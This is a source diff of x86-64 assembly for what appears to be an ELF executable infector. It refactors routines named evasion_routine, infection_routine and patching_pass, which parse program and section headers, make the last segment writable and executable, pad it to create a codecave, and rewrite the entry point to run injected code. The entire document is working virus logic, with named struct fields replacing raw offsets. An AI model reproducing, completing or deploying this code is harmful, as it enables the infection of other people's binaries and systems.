@@ -233,7 +233,7 @@ evasion_routine:
     pop rax
     add rsp, DIRENT_BUF_SZ
 
-mov rax, 1
+    mov rax, 1
 .ret:
     pop r10
     pop r9
@@ -376,9 +376,7 @@ infection_routine:
     jz .roots_iter_end
     jmp .roots_iter
 
-.roots_iter_end:
-
-    
+.roots_iter_end:  
 
 .ret:
     pop r8
@@ -603,10 +601,12 @@ get_entry_offset:
     je .loop_end
 
     ; vaddr -> rdx 
-    mov rdx, qword [rdi + 0x10]
+    mov rdx, qword [rdi + pheader.p_vaddr]
+
     
     ; vaddr + mem size -> rcx
-    mov rcx, qword [rdi + 0x28]
+    mov rcx, qword [rdi + pheader.p_memsz]
+
     add rcx, rdx
 
     ; cmp  in range? if yes, set rax to pheader offset + remainder and jump to loop end
@@ -618,9 +618,11 @@ get_entry_offset:
     jge .loop_iter
 
     ; entry offset = pheader file offset from rdi + (entrypoint from r8 - pheader.vaddr from rdi)
-    mov rax, qword [rdi + 0x08]
+    mov rax, qword [rdi + pheader.p_offset]
+
     add rax, r8
-    sub rax, qword [rdi + 0x10]
+    sub rax, qword [rdi + pheader.p_vaddr]
+
     
     jmp .loop_end
 
@@ -665,10 +667,12 @@ patching_pass:
     je .pheader_loop_end
 
     ; vaddr -> rdx 
-    mov rdx, qword [rdi + 0x10]
+    mov rdx, qword [rdi + pheader.p_vaddr]
+
 
     ; vaddr + size in mem -> rcx
-    mov rcx, qword [rdi + 0x28]
+    mov rcx, qword [rdi + pheader.p_memsz]
+
     add rcx, rdx
 
     ; is it bigger than curr furthest vaddr? if no, continue
@@ -691,12 +695,11 @@ patching_pass:
     imul rsi, 0x38
     sub rdi, rsi ; pheader in question -> rdi
 
-	mov rbx, qword [rdi + 0x10]
-    add rbx, qword [rdi + 0x28]
+    mov rbx, qword [rdi + pheader.p_vaddr]
+    add rbx, qword [rdi + pheader.p_memsz]
     lea rax, [rel _start]
     lea rcx, [rel params]
     sub rax, rcx
-    ; sub rax , 1 ; NOTE: 1 character offset
     add rbx, rax ; new entry -> rbx
     
     ; rdi - pheader in question
@@ -721,8 +724,8 @@ patching_pass:
     mov dword [rdi + 0x04], 0x7
 
     ; change mem and file size
-    add qword [rdi + 0x20], MAX_FILE_PAD
-    add qword [rdi + 0x28], MAX_FILE_PAD
+    add qword [rdi + pheader.p_memsz], MAX_FILE_PAD
+    add qword [rdi + pheader.p_filesz], MAX_FILE_PAD
 
 	; change section header offset
     add qword [r9 + 0x28], MAX_FILE_PAD
@@ -731,8 +734,8 @@ patching_pass:
     mov qword [r9 + 0x18], rbx
 
     ; get file offset of segment
-    mov rax, qword [rdi + 0x08]
-    add rax, qword [rdi + 0x20]  ; segment file offset + file size -> rax
+    mov rax, qword [rdi + pheader.p_offset]
+    add rax, qword [rdi + pheader.p_filesz]  ; segment file offset + file size -> rax
 
     ; locate section header for start offset
     mov rdi, r9
@@ -750,7 +753,7 @@ patching_pass:
     jge .shloop_end
 
     ; adjusted offset -> rdx
-    mov rdx, qword [rdi + 0x18]
+    mov rdx, qword [rdi + sheader.sh_offset]
     add rdx, MAX_FILE_PAD
 
     ; is it bigger than segment file offset + size rax?
@@ -758,7 +761,7 @@ patching_pass:
     jl .shloop_iter
 
 	; if it is, add the offset
-    add qword [rdi + 0x18], MAX_FILE_PAD
+    add qword [rdi + sheader.sh_offset], MAX_FILE_PAD
 
     ; NOTE: ignoring vaddr here because the 
     ; codecave should not have addressing after it
@@ -812,8 +815,9 @@ write_params:
 
 	; calculate offset to write in file
     ; account for uninitialized extra mem space
-    mov r8, qword [rdi + 0x8]
-    add r8, qword [rdi + 0x28] ; file offset at edge -> r8
+    mov r8, qword [rdi + pheader.p_offset]
+    add r8, qword [rdi + pheader.p_memsz] ; file offset at edge -> r8
+
 
     ; ; calculate entry gap from _start (incl param + signature gap)
     ; mov rbx, rcx
@@ -874,10 +878,10 @@ padding_pass:
     je .loop_end
 
     ; vaddr -> rdx 
-    mov rdx, qword [rdi + 0x10]
+    mov rdx, qword [rdi + pheader.p_vaddr]
     
     ; vaddr + size in mem -> rcx
-    mov rcx, qword [rdi + 0x28]
+    mov rcx, qword [rdi + pheader.p_memsz]
     add rcx, rdx
 
     ; is it bigger than curr furthest vaddr? if no, continue
@@ -901,8 +905,8 @@ padding_pass:
     imul rsi, 0x38
     sub rdi, rsi
 
-    mov rdx, qword [rdi + 0x08] 
-    add rdx, qword [rdi + 0x20] ; dst offset for mempad -> rdx
+    mov rdx, qword [rdi + pheader.p_offset] 
+    add rdx, qword [rdi + pheader.p_filesz] ; dst offset for mempad -> rdx
 
 	; fill in start_offset -> end_offset
 
